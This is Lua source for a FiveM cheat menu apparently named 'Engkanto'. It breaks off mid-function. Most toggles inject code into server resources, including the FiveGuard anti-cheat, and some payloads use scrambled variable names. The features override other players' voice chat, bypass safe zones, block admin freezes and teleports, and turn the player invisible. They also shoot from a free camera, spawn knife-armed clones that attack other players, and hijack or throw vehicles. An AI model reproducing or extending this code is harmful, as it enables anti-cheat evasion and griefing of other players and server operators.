MachoMenuCheckbox(PlayerTabSections[1], "Force Driveby", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
        zXcVbNmQwErTyUi = true

        local function UEvLBcXqM6()
            local cVbNmAsDfGhJkLz = CreateThread
            cVbNmAsDfGhJkLz(function()
                while zXcVbNmQwErTyUi and not Unloaded do
                    local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                    local eRtYuIoPaSdFgHi = PlayerPedId()

                    lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                    Wait(0)
                end
            end)
        end

        UEvLBcXqM6()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        zXcVbNmQwErTyUi = false
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Voice Hack",
    function()
        if isVoiceOverrideActive then return end 
        isVoiceOverrideActive = true
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
            local voiceOverrideEnabled = true
            
            Citizen.CreateThread(function()
                local playerPed = GetPlayerPed(-1)
                local playerCoords = GetEntityCoords(playerPed)
                local currentVoiceRange = 566660.0
                
                while voiceOverrideEnabled do
                    NetworkSetTalkerProximity(currentVoiceRange + 5.0)
                    
                    local players = GetActivePlayers()
                    for _, player in ipairs(players) do
                        local otherPed = GetPlayerPed(player)
                        local otherCoords = GetEntityCoords(otherPed)
                        local distance = #(playerCoords - otherCoords)
                        SetPlayerTalkingOverride(player, true)
                    end
                    
                    Citizen.Wait(0) 
                end
            end)
            
           
            _G["]] .. resourceId .. [[_stop"] = function()
                voiceOverrideEnabled = false
                NetworkSetTalkerProximity(0.0)
                local players = GetActivePlayers()
                for _, player in ipairs(players) do
                    SetPlayerTalkingOverride(player, false)
                end

            end
        ]])
    end,
    function()
        if not isVoiceOverrideActive then return end
        isVoiceOverrideActive = false
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
            if _G["]] .. resourceId .. [[_stop"] then
                _G["]] .. resourceId .. [[_stop"]()
                _G["]] .. resourceId .. [[_stop"] = nil 
            end
        ]])
    end
)

MachoMenuCheckbox(PlayerTabSections[1], "Anti Safezone",
    function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
            _G.isBypassSafeZoneActive = true
            Citizen.CreateThread(function()
                while _G.isBypassSafeZoneActive do
                    local playerPed = PlayerPedId()
                    NetworkSetFriendlyFireOption(true)
                    SetCanAttackFriendly(playerPed, true, true)
                    DisablePlayerFiring(playerPed, false)
                    EnableAllControlActions(0)
                    EnableAllControlActions(1)
                    if IsPedInAnyVehicle(playerPed, false) then
                        local vehicle = GetVehiclePedIsIn(playerPed, false)
                        if DoesEntityExist(vehicle) and not IsEntityDead(vehicle) then
                            local maxSpeed = 100.0
                            SetEntityMaxSpeed(vehicle, maxSpeed)
                            SetVehicleEnginePowerMultiplier(vehicle, 1.0)
                            SetVehicleEngineTorqueMultiplier(vehicle, 1.0)
                        end
                    end
                    Citizen.Wait(0)
                end
            end)
        ]])
    end,
    function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
            _G.isBypassSafeZoneActive = false
            local playerPed = PlayerPedId()
            NetworkSetFriendlyFireOption(false)
            SetCanAttackFriendly(playerPed, false, false)
            DisablePlayerFiring(playerPed, true)
            if IsPedInAnyVehicle(playerPed, false) then
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                if DoesEntityExist(vehicle) then
                    local defaultSpeed = 27.7778
                    SetEntityMaxSpeed(vehicle, defaultSpeed)
                    SetVehicleEnginePowerMultiplier(vehicle, 1.0)
                    SetVehicleEngineTorqueMultiplier(vehicle, 1.0)
                end
            end
        ]])
    end
)

_isSoloSessionActive = false
MachoMenuCheckbox(PlayerTabSections[1], "Solo Session", 
    function() 
        local playerPed = PlayerPedId()
        _isSoloSessionActive = true
        NetworkStartSoloTutorialSession()
        NetworkSetEntityInvisibleToNetwork(playerPed, true)
        SetNetworkIdCanMigrate(PlayerId(), false)
        MachoMenuNotification("Engkanto", "Solo session enabled!")
    end,
    function() 
        _isSoloSessionActive = false
        local playerPed = PlayerPedId()
        NetworkEndTutorialSession()
        SetNetworkIdCanMigrate(PlayerId(), true)
        NetworkSetEntityInvisibleToNetwork(playerPed, false)
        MachoMenuNotification("Engkanto", "Solo session disabled!")
    end
)

MachoMenuCheckbox(PlayerTabSections[1], "Anti-Headshot", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if yHnvrVNkoOvGMWiS == nil then yHnvrVNkoOvGMWiS = false end
        yHnvrVNkoOvGMWiS = true

        local eeitKYqDwYbPslTW = CreateThread
        local function LIfbdMbeIAeHTnnx()
            eeitKYqDwYbPslTW(function()
                while yHnvrVNkoOvGMWiS and not Unloaded do
                    local fhw72q32d8sfj = SetPedSuffersCriticalHits
                    fhw72q32d8sfj(PlayerPedId(), false)
                    Wait(0)
                end
            end)
        end

        LIfbdMbeIAeHTnnx()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        yHnvrVNkoOvGMWiS = false
        fhw72q32d8sfj(PlayerPedId(), true)
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Anti-Freeze", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if nHgFdSaZxCvBnMq == nil then nHgFdSaZxCvBnMq = false end
        nHgFdSaZxCvBnMq = true

        local sdfw3w3tsdg = CreateThread
        local function XELa6FJtsB()
            sdfw3w3tsdg(function()
                while nHgFdSaZxCvBnMq and not Unloaded do
                    local fhw72q32d8sfj = FreezeEntityPosition
                    local segfhs317dsgf = ClearPedTasks

                    if IsEntityPositionFrozen(PlayerPedId()) then
                        fhw72q32d8sfj(PlayerPedId(), false)
                        segfhs317dsgf(PlayerPedId())
                    end
                    
                    Wait(0)
                end
            end)
        end

        XELa6FJtsB()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        nHgFdSaZxCvBnMq = false
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Anti-Blackscreen", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if aDjsfmansdjwAEl == nil then aDjsfmansdjwAEl = false end
        aDjsfmansdjwAEl = true

        local sdfw3w3tsdg = CreateThread
        local function XELWAEDa6FJtsB()
            sdfw3w3tsdg(function()
                while aDjsfmansdjwAEl and not Unloaded do
                    DoScreenFadeIn(0)
                    Wait(0)
                end
            end)
        end

        XELWAEDa6FJtsB()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        aDjsfmansdjwAEl = false
    ]])
end)

local antiCarryLoop = false
local lastFreePosition = nil
MachoMenuCheckbox(PlayerTabSections[1], "Anti Carry & Drag", 
   function()
       antiCarryLoop = true
       local playerPed = PlayerPedId()
       lastFreePosition = GetEntityCoords(playerPed)
       MachoMenuNotification("Engkanto Menu", "Activated")
       
       Citizen.CreateThread(function()
           while antiCarryLoop do
               local playerPed = PlayerPedId()
               
               -- Check if player is being carried or attached
               if IsEntityAttached(playerPed) then
                   -- Get who is carrying/attached to
                   local attachedTo = GetEntityAttachedTo(playerPed)
                   
                   if DoesEntityExist(attachedTo) then
                       -- Check if attached to another player
                       local isAttachedToPlayer = false
                       local carrierInfo = "Unknown"
                       
                       for i = 0, 255 do
                           if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                               local otherPlayerPed = GetPlayerPed(i)
                               if otherPlayerPed == attachedTo then
                                   isAttachedToPlayer = true
                                   local playerName = GetPlayerName(i) or "Unknown"
                                   local serverId = GetPlayerServerId(i) or 0
                                   carrierInfo = string.format("%s (ID: %d, Server: %d)", playerName, i, serverId)
                                   break
                               end
                           end
                       end
                       
                       -- Detach from player carries
                       if isAttachedToPlayer then
                           DetachEntity(playerPed, true, true)
                           
                           -- Return to last safe position
                           if lastFreePosition then
                               SetEntityCoords(playerPed, lastFreePosition.x, lastFreePosition.y, lastFreePosition.z, false, false, false, true)
                           end
                           
                           -- Clear any carry animations
                           ClearPedTasks(playerPed)
                           ClearPedSecondaryTask(playerPed)
                           
                           MachoMenuNotification(" Carry ", 
                               string.format("Prevented Carry & Drag by: %s", carrierInfo))
                       end
                   end
               else
                   -- Not attached - update safe position
                   local currentPos = GetEntityCoords(playerPed)
                   
                   -- Only update if player is not in a weird state
                   if not IsPedRagdoll(playerPed) and not IsPedBeingStunned(playerPed) then
                       lastFreePosition = currentPos
                   end
               end
               
               -- Also prevent pickup animations
               if IsPedBeingStunned(playerPed, 0) then
                   SetPedToRagdoll(playerPed, 1, 1, 0, 0, 0, 0)
                   ClearPedTasks(playerPed)
               end
               
               -- Prevent being grabbed
               if GetPedConfigFlag(playerPed, 292, true) then -- PED_CONFIG_FLAG_DisableMelee
                   SetPedConfigFlag(playerPed, 292, false)
               end
               
               Citizen.Wait(100)
           end
       end)
   end,
   function()
       antiCarryLoop = false
       lastFreePosition = nil
       MachoMenuNotification("Engkanto Menu", "Deactivated")
   end
)

MachoMenuCheckbox(PlayerTabSections[1], "Anti-Crash ",
    function()
        MachoInjectResource('monitor', [[
            _G.MachoAntiCrashActive = true
            Citizen.CreateThread(function()
                while _G.MachoAntiCrashActive do
                    local myPed = PlayerPedId()
                    local myPos = GetEntityCoords(myPed)
                    
                    local handle, ped = FindFirstPed()
                    local success
                    repeat
                        if DoesEntityExist(ped) and ped ~= myPed and not IsPedAPlayer(ped) then
                            local pedPos = GetEntityCoords(ped)
                            local dist = #(myPos - pedPos)
                            
                            if dist < 10.0 then
                                SetEntityAsMissionEntity(ped, true, true)
                                DeleteEntity(ped)
                            end
                        end
                        success, ped = FindNextPed(handle)
                    until not success
                    EndFindPed(handle)
                    
                    Wait(200) 
                end
            end)
        ]])
    end,
    function()
        MachoInjectResource('monitor', [[
            _G.MachoAntiCrashActive = false
        ]])
    end
)

MachoMenuCheckbox(PlayerTabSections[1], "Anti Teleport",
    function()
        MachoInjectResource('any', [[
                _G.AntiTeleport = true
                CreateThread(function()
                    local ped = PlayerPedId()
                    local lastPos = GetEntityCoords(ped)

                    while _G.AntiTeleport do
                        ped = PlayerPedId()
                        local currentPos = GetEntityCoords(ped)
                        local dist = #(currentPos - lastPos)

                        local isDead = IsEntityDead(ped)
                        local isFading = IsScreenFadedOut() or IsScreenFadingOut()
                        local inVehicle = IsPedInAnyVehicle(ped, false)

                        if dist > 100.0 and not isDead and not isFading and not inVehicle then
                            SetEntityCoordsNoOffset(ped, lastPos.x, lastPos.y, lastPos.z, false, false, false)
                            if sendSnackbarMessage then
                                sendSnackbarMessage('error', 'Blocked teleport attempt', true)
                            end
                        else
                            lastPos = currentPos
                        end

                        Wait(0)
                    end
                end)
            ]])
    end,
    function()
        MachoInjectResource('monitor', [[
            _G.AntiTeleport = false
        ]])
    end
)

MachoMenuCheckbox(PlayerTabSections[1], "Slide Movement", function()
    MachoMenuNotification("Engkanto", "Press G to Slide")
    MachoInjectResource("monitor", [[
    CreateThread(function()
        while true do
            Wait(0)
            if IsControlJustPressed(0, 47) then
                local playerPed = PlayerPedId()
                RequestAnimDict("missheistfbi3b_ig6_v2")
                while not HasAnimDictLoaded("missheistfbi3b_ig6_v2") do Wait(10) end
                TaskPlayAnim(playerPed, "missheistfbi3b_ig6_v2", "rubble_slide_gunman", 8.0, -8.0, 1000, 1, 0, false, false, false)
                local forwardVector = GetEntityForwardVector(playerPed)
                local slideSpeed = 20.0
                ApplyForceToEntityCenterOfMass(playerPed, 1, forwardVector.x * slideSpeed, forwardVector.y * slideSpeed, 0.0, true, true, true, true)
            end
        end
    end)
 ]])
end)  

MachoMenuCheckbox(PlayerTabSections[1], "Free Cam", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        g_FreecamFeatureEnabled = true
        
        local function initializeFreecam()
            -- Script State
            local isFreecamActive = false
            local freecamHandle = nil
            local targetCoords, targetEntity = nil, nil
            local currentFeatureIndex = 1

            -- NEW FEATURE: Ped Spawning State
            local pedsToSpawn = { "s_m_m_movalien_01", "u_m_y_zombie_01", "s_m_y_blackops_01", "csb_abigail", "a_c_coyote" }
            local currentPedIndex = 1

            local stopFreecam, startFreecam

            -- Feature Definitions (Now with Ped Spawner)
            local Features = { 
                "Look-Around", 
                "Spawn Ped",         -- ADDED
                "Teleport", 
                "Delete Entity", 
                "Fling Entity", 
                "Flip Vehicle", 
                "Launch Vehicle",
                "Teleport Vehicle",
                "Mess With Vehicle"
            }

            -- Helper Function for Drawing Text
            local function drawText(content, x, y, options)
                SetTextFont(options.font or 4)
                SetTextScale(0.0, options.scale or 0.3)
                SetTextColour(options.color[1], options.color[2], options.color[3], options.color[4])
                SetTextOutline()
                if options.shadow then SetTextDropShadow(2, 0, 0, 0, 255) end
                SetTextCentre(true)
                BeginTextCommandDisplayText("STRING")
                AddTextComponentSubstringPlayerName(content)
                EndTextCommandDisplayText(x, y)
            end

            -- Main Draw Thread (UI Only)
            local function drawThread()
                while isFreecamActive do
                    Wait(0)
                    -- Draw Crosshair
                    drawText("•", 0.5, 0.485, {font = 4, scale = 0.5, color = {255,255,255,200}})
                    
                    -- ##### UI FIX: SCROLLING MENU LOGIC #####
                    local ui = { x = 0.5, y = 0.75, lineHeight = 0.03, maxVisible = 7, colors = { text = {245, 245, 245, 120}, selected = {0, 255, 255, 255} } }
                    local numFeatures = #Features
                    local startIdx, endIdx = 1, numFeatures

                    if numFeatures > ui.maxVisible then
                        startIdx = math.max(1, currentFeatureIndex - math.floor(ui.maxVisible / 2))
                        endIdx = math.min(numFeatures, startIdx + ui.maxVisible - 1)
                        if endIdx == numFeatures then
                            startIdx = numFeatures - ui.maxVisible + 1
                        end
                    end

                    -- Draw a counter above the list
                    drawText(("%d/%d"):format(currentFeatureIndex, numFeatures), ui.x, ui.y - 0.035, {scale = 0.25, color = {255,255,255,120}})

                    local displayCount = 0
                    for i = startIdx, endIdx do
                        local featureName = Features[i]
                        local isSelected = (i == currentFeatureIndex)
                        local lineY = ui.y + (displayCount * ui.lineHeight)
                        if isSelected then
                            drawText(("[ %s ]"):format(featureName), ui.x, lineY, {scale = 0.32, color = ui.colors.selected, shadow = true})
                        else
                            drawText(featureName, ui.x, lineY, {scale = 0.28, color = ui.colors.text})
                        end
                        displayCount = displayCount + 1
                    end
                end
            end

            -- Main Input and Logic Thread
            local function logicThread()
                while isFreecamActive do
                    Wait(0)
                    if IsDisabledControlJustPressed(0, 241) then currentFeatureIndex = (currentFeatureIndex - 2 + #Features) % #Features + 1 elseif IsDisabledControlJustPressed(0, 242) then currentFeatureIndex = (currentFeatureIndex % #Features) + 1 end
                    
                    if IsDisabledControlJustPressed(0, 24) then -- Action Key Pressed
                        local currentFeature = Features[currentFeatureIndex]
                        if currentFeature == "Teleport" and targetCoords then
                            local ped = PlayerPedId()
                            local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, false)
                            SetEntityCoords(ped, targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z, false, false, false, true)
                        -- ##### NEW FEATURE: SAFE PED SPAWNER LOGIC #####
                        elseif currentFeature == "Spawn Ped" and targetCoords then
                            local model = pedsToSpawn[currentPedIndex]
                            CreateThread(function()
                                local modelHash = GetHashKey(model)
                                RequestModel(modelHash)
                                local timeout = 2000 -- 2 second timeout for model loading
                                while not HasModelLoaded(modelHash) and timeout > 0 do
                                    Wait(100)
                                    timeout = timeout - 100
                                end
                                if HasModelLoaded(modelHash) then
                                    local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z, false)
                                    local spawnPos = vector3(targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z)
                                    local newPed = CreatePed(4, modelHash, spawnPos.x, spawnPos.y, spawnPos.z, 0.0, true, true)
                                    SetModelAsNoLongerNeeded(modelHash)
                                    TaskStandStill(newPed, -1) -- Make them stand still
                                    currentPedIndex = (currentPedIndex % #pedsToSpawn) + 1 -- Cycle to the next ped for next time
                                end
                            end)
                        elseif currentFeature == "Delete Entity" and targetEntity and DoesEntityExist(targetEntity) then
                            SetEntityAsMissionEntity(targetEntity, true, true)
                            DeleteEntity(targetEntity)
                        elseif currentFeature == "Fling Entity" and targetEntity and (IsEntityAPed(targetEntity) or IsEntityAVehicle(targetEntity)) then
                            ApplyForceToEntity(targetEntity, 1, math.random(-50.0, 50.0), math.random(-50.0, 50.0), 50.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                        elseif currentFeature == "Flip Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                            SetVehicleOnGroundProperly(targetEntity)
                        elseif currentFeature == "Launch Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                            ApplyForceToEntity(targetEntity, 1, 0.0, 0.0, 100.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                        elseif currentFeature == "Teleport Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                            local currentCoords = GetEntityCoords(targetEntity)
                            local newCoords = currentCoords + GetEntityForwardVector(targetEntity) * 5.0 + vector3(0.0, 0.0, 50.0)
                            SetEntityCoords(targetEntity, newCoords.x, newCoords.y, newCoords.z, false, false, false, true)
                        elseif currentFeature == "Mess With Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                            local actions = {
                                function(veh) SetVehicleTyreBurst(veh, math.random(0, 5), false, 1000.0) end,
                                function(veh) SetVehicleDoorOpen(veh, math.random(0, 5), false, false) end,
                                function(veh) SetVehicleEngineOn(veh, not IsVehicleEngineOn(veh), false, true) end,
                                function(veh) SetVehicleLights(veh, math.random(0, 2)) end,
                                function(veh) StartVehicleHorn(veh, 1000, "HELDDOWN", false) end
                            }
                            local randomAction = actions[math.random(#actions)]
                            randomAction(targetEntity)
                        end
                    end
                end
            end

            -- Main Camera Movement Thread (Unchanged)
            local function cameraThread()
                local baseSpeed, boostSpeed, slowSpeed = 1.0, 9.0, 0.1; local mouseSensitivity = 7.5; local function clamp(val, min, max) return math.max(min, math.min(max, val)) end; local function rotToDir(rot) local rX, rZ = math.rad(rot.x), math.rad(rot.z); return vector3(-math.sin(rZ)*math.cos(rX), math.cos(rZ)*math.cos(rX), math.sin(rX)) end;
                while isFreecamActive do
                    Wait(0)
                    local camPos, camRotRaw = GetCamCoord(freecamHandle), GetCamRot(freecamHandle, 2); local camRot = { x = camRotRaw.x, y = camRotRaw.y, z = camRotRaw.z }; local direction = rotToDir(camRot); local right = vector3(direction.y, -direction.x, 0)
                    local speed = baseSpeed; if IsDisabledControlPressed(0, 21) then speed = boostSpeed end; if IsDisabledControlPressed(0, 19) then speed = slowSpeed end
                    if IsDisabledControlPressed(0, 32) then camPos = camPos + direction * speed end; if IsDisabledControlPressed(0, 33) then camPos = camPos - direction * speed end; if IsDisabledControlPressed(0, 34) then camPos = camPos - right * speed end; if IsDisabledControlPressed(0, 35) then camPos = camPos + right * speed end; if IsDisabledControlPressed(0, 22) then camPos = camPos + vector3(0, 0, 1.0) * speed end; if IsDisabledControlPressed(0, 36) then camPos = camPos - vector3(0, 0, 1.0) * speed end
                    local mX, mY = GetControlNormal(0,1)*mouseSensitivity, GetControlNormal(0,2)*mouseSensitivity; camRot.x = clamp(camRot.x-mY, -89.0, 89.0); camRot.z = camRot.z-mX
                    SetCamCoord(freecamHandle, camPos.x, camPos.y, camPos.z); SetCamRot(freecamHandle, camRot.x, camRot.y, camRot.z, 2); SetFocusPosAndVel(camPos.x, camPos.y, camPos.z, 0.0, 0.0, 0.0)
                    local ray = StartShapeTestRay(camPos.x, camPos.y, camPos.z, camPos.x+direction.x*1000.0, camPos.y+direction.y*1000.0, camPos.z+direction.z*1000.0, -1, PlayerPedId(), 7); local _, hit, coords, _, entity = GetShapeTestResult(ray); if hit then targetCoords, targetEntity = coords, entity else targetCoords, targetEntity = nil, nil end
                end
            end
            
            startFreecam = function()
                if isFreecamActive then return end
                isFreecamActive = true
                local startPos, startRot, startFov = GetGameplayCamCoord(), GetGameplayCamRot(2), GetGameplayCamFov()
                freecamHandle = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", startPos.x, startPos.y, startPos.z, startRot.x, startRot.y, startRot.z, startFov, true, 2)
                
                if not DoesCamExist(freecamHandle) then isFreecamActive = false; return end

                RenderScriptCams(true, false, 0, true, true)
                SetCamActive(freecamHandle, true)
                CreateThread(drawThread)
                CreateThread(logicThread)
                CreateThread(cameraThread)
            end

            stopFreecam = function()
                if not isFreecamActive then return end
                isFreecamActive = false
                if freecamHandle and DoesCamExist(freecamHandle) then SetCamActive(freecamHandle, false); RenderScriptCams(false, false, 0, true, true); DestroyCam(freecamHandle, false) end
                Wait(10); SetFocusEntity(PlayerPedId()); ClearFocus()
                freecamHandle = nil
            end
            
            CreateThread(function()
                while g_FreecamFeatureEnabled and not Unloaded do Wait(0)
                    if IsDisabledControlJustPressed(0, 74) then -- H key
                        if isFreecamActive then stopFreecam()
                        else startFreecam() end
                    end
                end
            end)
        end
        
        initializeFreecam()
    ]])
end, function()
    MachoInjectResource((CheckResource("core") and "core") or (CheckResource("es_extended") and "es_extended") or (CheckResource("qb-core") and "qb-core") or (CheckResource("monitor") and "monitor") or "any", [[
        g_FreecamFeatureEnabled = false
        if isFreecamActive and stopFreecam then stopFreecam() end
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Freecam II", 
    function()
        MachoMenuNotification("Engkanto", "ENABLED: Press K to toggle camera")
        MachoInjectResource("any", [===[
            _G.freecamMaster = true
            _G.freecamEnabled = false
            _G.selectedIndex = 1

            local pistolHash = GetHashKey("WEAPON_PISTOL")
            local carbineHash = GetHashKey("WEAPON_CARBINERIFLE")

            local menuOptions = {"Shoot (Semi)", "Shoot (Auto)", "Evil Twin (Risky)", "Attach Prop", "Map Destoryer", "Tp Me", "Throw Vehicle", "Delete Entity", "Hijack Vehicle"}

            local function DrawMenuItem(label, x, y, selected)
                SetTextFont(0)
                SetTextScale(0.28, 0.28) 
                SetTextOutline()
                if selected then SetTextColour(0, 255, 255, 255) else SetTextColour(255, 255, 255, 255) end
                SetTextCentre(true)
                BeginTextCommandDisplayText("STRING")
                AddTextComponentSubstringPlayerName(label)
                EndTextCommandDisplayText(x, y)
            end

            local function RotationToDirection(rot)
                local z, x = math.rad(rot.z), math.rad(rot.x)
                return vector3(-math.sin(z) * math.abs(math.cos(x)), math.cos(z) * math.abs(math.cos(x)), math.sin(x))
            end

            _G.StartFreecam = function(active)
                local ped = PlayerPedId()
                FreezeEntityPosition(ped, active)
                SetEntityInvincible(ped, active)

                if active then
                    _G._fc_pos = GetGameplayCamCoord()
                    local rot = GetGameplayCamRot(2)
                    _G._fc_rot = vector3(rot.x, 0.0, rot.z)
                    _G._fc_cam = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                    SetCamActive(_G._fc_cam, true)
                    RenderScriptCams(true, true, 500, true, true)
                    
                    Citizen.CreateThread(function()
                        while _G.freecamEnabled do
                            Wait(0)
                            local menuX, startY = 0.5, 0.72 
                            for i, name in ipairs(menuOptions) do 
                                DrawMenuItem(name, menuX, startY + (i * 0.025), (i == _G.selectedIndex)) 
                            end

                            DrawRect(0.5, 0.5, 0.002, 0.004, 255, 0, 0, 255)

                            local lookX, lookY = GetDisabledControlNormal(0, 1), GetDisabledControlNormal(0, 2)
                            _G._fc_rot = vector3(math.max(math.min(_G._fc_rot.x + (-lookY * 8), 80.0), -80.0), 0.0, _G._fc_rot.z + (-lookX * 8))
                            local speed = IsDisabledControlPressed(0, 21) and 2.5 or (IsDisabledControlPressed(0, 19) and 0.05 or 0.5)
                            local rx, rz = math.rad(_G._fc_rot.x), math.rad(_G._fc_rot.z)
                            local dir = vector3(-math.sin(rz) * math.cos(rx), math.cos(rz) * math.cos(rx), math.sin(rx))
                            local sDir = vector3(-math.cos(rz), -math.sin(rz), 0.0)
                            
                            if IsDisabledControlPressed(0, 32) then _G._fc_pos = _G._fc_pos + (dir * speed) end 
                            if IsDisabledControlPressed(0, 33) then _G._fc_pos = _G._fc_pos - (dir * speed) end 
                            if IsDisabledControlPressed(0, 34) then _G._fc_pos = _G._fc_pos + (sDir * speed) end 
                            if IsDisabledControlPressed(0, 35) then _G._fc_pos = _G._fc_pos - (sDir * speed) end 
                            
                            SetCamCoord(_G._fc_cam, _G._fc_pos.x, _G._fc_pos.y, _G._fc_pos.z)
                            SetCamRot(_G._fc_cam, _G._fc_rot.x, _G._fc_rot.y, _G._fc_rot.z, 2)
                            SetAudioFlag("UseScriptedCameraFilter", true)
                            DisableControlAction(0, 30, true) DisableControlAction(0, 31, true)
                            DisableControlAction(0, 32, true) DisableControlAction(0, 33, true)
                            DisableControlAction(0, 34, true) DisableControlAction(0, 35, true)
                            DisableControlAction(0, 1, true) DisableControlAction(0, 2, true)
                            DisableControlAction(0, 24, true)
                            DisableControlAction(0, 14, true) DisableControlAction(0, 15, true)
                        end
                    end)

                    Citizen.CreateThread(function()
                        while _G.freecamEnabled do
                            Wait(0)
                            local currentPed = PlayerPedId()
                            local mode = menuOptions[_G.selectedIndex]

                            if IsDisabledControlJustPressed(0, 15) then _G.selectedIndex = (_G.selectedIndex - 2) % #menuOptions + 1
                            elseif IsDisabledControlJustPressed(0, 14) then _G.selectedIndex = _G.selectedIndex % #menuOptions + 1 end

                            local camRot = GetCamRot(_G._fc_cam, 2)
                            local camPos = GetCamCoord(_G._fc_cam)
                            local direction = RotationToDirection(camRot)
                            local ray = StartExpensiveSynchronousShapeTestLosProbe(camPos.x, camPos.y, camPos.z, camPos.x + (direction.x * 500), camPos.y + (direction.y * 500), camPos.z + (direction.z * 500), -1, currentPed, 4)
                            local _, hit, coords, _, targetEntity = GetShapeTestResult(ray)

                            local isPressing = IsDisabledControlPressed(0, 24)
                            local isJustPressed = IsDisabledControlJustPressed(0, 24)

                            if (mode == "Shoot (Auto)" and isPressing) or (mode ~= "Shoot (Auto)" and isJustPressed) then
                                local finalOwner = 0 
                                if hit and DoesEntityExist(targetEntity) then
                                    finalOwner = targetEntity
                                end

                                if mode == "Shoot (Semi)" then
                                    ShootSingleBulletBetweenCoords(camPos.x, camPos.y, camPos.z, coords.x, coords.y, coords.z, 1000, true, pistolHash, currentPed, true, true, 1000.0)
                                elseif mode == "Shoot (Auto)" then
                                    ShootSingleBulletBetweenCoords(camPos.x, camPos.y, camPos.z, coords.x, coords.y, coords.z, 1000, true, carbineHash, currentPed, true, true, 1000.0)
                                    Wait(100)
                                elseif mode == "Evil Twin (Risky)" and hit then
                                    if DoesEntityExist(targetEntity) and IsEntityAPed(targetEntity) then
                                        local model = GetEntityModel(targetEntity)
                                        RequestModel(model)
                                        while not HasModelLoaded(model) do Wait(0) end
                                        local twin = ClonePed(targetEntity, GetEntityHeading(targetEntity), true, true)
                                        if DoesEntityExist(twin) then
                                            SetEntityCoords(twin, coords.x + 1.2, coords.y + 1.2, coords.z, false, false, false, true)
                                            SetEntityAsMissionEntity(twin, true, true)
                                            local weapon = GetHashKey("WEAPON_KNIFE")
                                            GiveWeaponToPed(twin, weapon, 1, false, true)
                                            SetCurrentPedWeapon(twin, weapon, true)
                                            SetPedCombatAttributes(twin, 46, true)
                                            SetPedCombatAbility(twin, 100)
                                            SetPedFleeAttributes(twin, 0, false)
                                            SetBlockingOfNonTemporaryEvents(twin, true)
                                            TaskCombatPed(twin, targetEntity, 0, 16)
                                            SetEntityAsNoLongerNeeded(twin)
                                        end
                                    end
                                elseif mode == "Hijack Vehicle" and hit then
                                    if DoesEntityExist(targetEntity) and IsEntityAVehicle(targetEntity) then
                                        NetworkRequestControlOfEntity(targetEntity)
                                        SetPedIntoVehicle(currentPed, targetEntity, -1)
                                        SetVehicleEngineOn(targetEntity, true, true, false)
                                        _G.freecamEnabled = false
                                        _G.StartFreecam(false)
                                    end
                                elseif mode == "Attach Prop" and hit then
                                    if DoesEntityExist(targetEntity) and IsEntityAPed(targetEntity) then
                                        local propHash = GetHashKey("prop_logpile_06b")
                                        RequestModel(propHash)
                                        while not HasModelLoaded(propHash) do Wait(0) end
                                        local obj = CreateObject(propHash, coords.x, coords.y, coords.z, true, true, true)
                                        AttachEntityToEntity(obj, targetEntity, GetPedBoneIndex(targetEntity, 24818), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                                        SetEntityAsNoLongerNeeded(obj)
                                    end
                                elseif mode == "Map Destoryer TESTING PALANG" then
                                    local sHash = GetHashKey("xs_propint3_waste_01_statues")
                                    RequestModel(sHash)
                                    while not HasModelLoaded(sHash) do Wait(0) end
                                    local obj = CreateObject(sHash, coords.x, coords.y, coords.z, true, true, true)                               
                                elseif mode == "Tp Me" then
                                    SetEntityCoords(currentPed, coords.x, coords.y, coords.z, false, false, false, false)
                                elseif mode == "Throw Vehicle" then
                                    local sHash = GetHashKey("jugular")
                                    RequestModel(sHash)
                                    while not HasModelLoaded(sHash) do Wait(0) end
                                    local veh = CreateVehicle(sHash, camPos.x, camPos.y, camPos.z, camRot.z, true, false)
                                    SetEntityVelocity(veh, direction.x * 100.0, direction.y * 100.0, direction.z * 100.0)
